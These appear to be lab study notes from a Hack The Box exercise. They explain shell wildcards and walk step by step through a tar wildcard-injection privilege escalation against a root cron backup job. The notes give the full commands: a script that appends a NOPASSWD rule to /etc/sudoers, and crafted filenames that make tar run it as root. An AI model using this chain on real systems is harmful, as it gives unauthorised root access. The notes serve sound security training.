

## Wildcards

|Wildcard|Meaning|
|---|---|
|`*`|matches any number of characters|
|`?`|matches one character|
|`[ ]`|matches specified character|
|`~`|user home directory|
|`-`|range inside brackets|

---

# Main Vulnerability

## Vulnerable Cron Job

```bash
*/01 * * * * cd /home/htb-student && tar -zcf /home/htb-student/backup.tar.gz *
```

### Problem

`*` expands all filenames in directory.

If attacker creates filenames starting with `--`, tar interprets them as command options.

---

# Important Tar Options

## Checkpoint

```bash
--checkpoint=1
```

Creates checkpoint during tar execution.

---

## Execute Command

```bash
--checkpoint-action=exec=sh root.sh
```

Executes:

```bash
sh root.sh
```

---

# Attack Flow (Step-by-Step)

---

## Step 1: Create malicious script

```bash
echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
```

### Purpose

Adds sudo privilege for user.

---

## Step 2: Create fake filename as tar option

```bash
echo "" > "--checkpoint-action=exec=sh root.sh"
```

### Creates file:

```bash
--checkpoint-action=exec=sh root.sh
```

Tar later interprets this as command option.

---

## Step 3: Create checkpoint trigger

```bash
echo "" > --checkpoint=1
```

### Creates file:

```bash
--checkpoint=1
```

Enables checkpoint execution.

---

## Step 4: Wildcard expansion happens

Cron executes:

```bash
tar -zcf /home/htb-student/backup.tar.gz *
```

Shell expands to:

```bash
tar -zcf backup.tar.gz \
--checkpoint=1 \
--checkpoint-action=exec=sh root.sh \
root.sh
```

---

## Step 5: Tar executes script as root

Tar runs:

```bash
sh root.sh
```

Because cron job runs as root.

---

## Step 6: Sudoers modified

Added:

```bash
htb-student ALL=(root) NOPASSWD: ALL
```

to:

```bash
/etc/sudoers
```

---

## Step 7: Get root shell

```bash
sudo -l
```

Shows:

```bash
(root) NOPASSWD: ALL
```

Then:

```bash
sudo su
```

→ root access.
